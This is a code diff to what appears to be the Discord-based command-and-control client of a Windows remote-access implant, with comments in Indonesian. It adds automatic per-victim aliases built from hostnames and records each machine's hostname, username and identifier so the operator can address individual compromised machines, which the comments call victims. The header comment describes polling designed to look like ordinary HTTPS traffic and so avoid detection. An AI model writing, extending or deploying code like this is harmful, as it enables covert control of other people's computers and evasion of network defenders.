@@ -5,6 +5,8 @@ koneksinya jadi signature sendiri. Polling REST cukup requests, 3 detik interval
 kelihatan seperti request HTTPS biasa.
 """
 
+import os
+import socket
 import time
 
 import requests
@@ -16,6 +18,29 @@ from . import config
 API = config.API
 
 
+def auto_alias(uuid):
+    """Alias pendek yang unik per mesin, diturunkan dari nama host.
+
+    Versi lama membekukan alias waktu build (`--alias a`), jadi dua korban di
+    channel yang sama sama-sama menjawab `!a` dan nggak ada cara memilih salah
+    satu. Sekarang:
+
+        PC-KENTANQ          -> kent
+        DESKTOP-HOJVQB2     -> hojv
+        DESKTOP-ERMHNZW     -> ermh
+
+    Bagian sesudah tanda hubung diambil karena itu bagian yang beda-beda di
+    penamaan Windows. Kalau host kosong atau aneh, jatuh ke uuid.
+    """
+    try:
+        host = socket.gethostname() or ""
+    except Exception:
+        host = ""
+    tail = host.split("-")[-1] if "-" in host else host
+    slug = "".join(ch for ch in tail.lower() if ch.isalnum())[:4]
+    return slug or (uuid[:4].lower() if uuid else "x")
+
+
 class Discord:
     def __init__(self, token, channel, uuid, alias=None):
         self.token = token
@@ -23,7 +48,16 @@ class Discord:
         self.uuid = uuid
         # Alias dipakai buat prefix balasan di channel, bukan buat routing.
         # Mesin banyak = uuid8 nggak kebaca, [a] jauh lebih cepat dipindai.
-        self.alias = alias or uuid[:1]
+        # Alias dari builder cuma dipakai kalau diisi eksplisit.
+        self.alias = (alias or "").strip().lower() or auto_alias(uuid)
+        # Tiga penanda yang dipakai routing `!@<pola>`: nama host, user, uuid8.
+        # Tanpa ini, dua mesin ber-alias sama nggak bisa dipilih satu-satu.
+        self.uuid8 = uuid[:8].lower()
+        try:
+            self.host = (socket.gethostname() or "").lower()
+        except Exception:
+            self.host = ""
+        self.user = (os.getenv("USERNAME") or "").lower()
         self.session = requests.Session()
         # Content-Type sengaja TIDAK di-set di sini: multipart butuh boundary sendiri.
         host = API.split("/")[2]
